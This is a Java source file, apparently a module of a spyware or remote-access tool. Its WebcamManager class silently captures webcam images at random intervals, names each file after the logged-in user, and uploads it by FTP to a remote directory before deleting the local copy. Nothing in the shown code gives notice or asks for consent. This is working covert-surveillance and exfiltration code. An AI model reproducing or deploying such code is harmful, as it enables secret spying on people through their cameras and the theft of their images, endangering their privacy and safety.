package fr.mimifan.jac.webcam;

import com.github.sarxos.webcam.Webcam;
import fr.mimifan.jac.ftp.FileTransferClient;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Random;

public class WebcamManager {


    public static void takePicture() {
        Random random = new Random();
        final int MAX_INTERVAL_MINUTES = 10;
        final int MAX_INTERVAL_MILLISECONDS = MAX_INTERVAL_MINUTES * 60 * 1000;
        while (true) {
            try {
                int intervalMilliseconds = random.nextInt(MAX_INTERVAL_MILLISECONDS) + 1;
                Webcam webcam = Webcam.getDefault();
                webcam.open();
                BufferedImage takenImage = webcam.getImage();
                String path = System.getProperty("user.name") + "_" + (System.currentTimeMillis() / 1000L / 5L) + ".png";
                File imageFile = new File(path);
                ImageIO.write(takenImage, "PNG", imageFile);

                FileInputStream inputStream = new FileInputStream(imageFile);
                FileTransferClient.getInstance().sendFile(FileTransferClient.getInstance().getWebcamDirectory() + "/" + path, inputStream);

                if(!imageFile.delete()) {
                    String message = "Whoopsie, sorry I couldn't delete " + imageFile.getAbsolutePath();
                    JOptionPane.showMessageDialog(new JFrame(), message, "Could not delete file",
                            JOptionPane.ERROR_MESSAGE);
                }
                webcam.close();

                Thread.sleep(intervalMilliseconds);
            } catch (InterruptedException | IOException e) {
                e.printStackTrace();
                String message = "Couldn't get camera to work ;-;";
                JOptionPane.showMessageDialog(new JFrame(), message, "Can't get webcam pictures",
                        JOptionPane.ERROR_MESSAGE);
            }
        }
    }



}
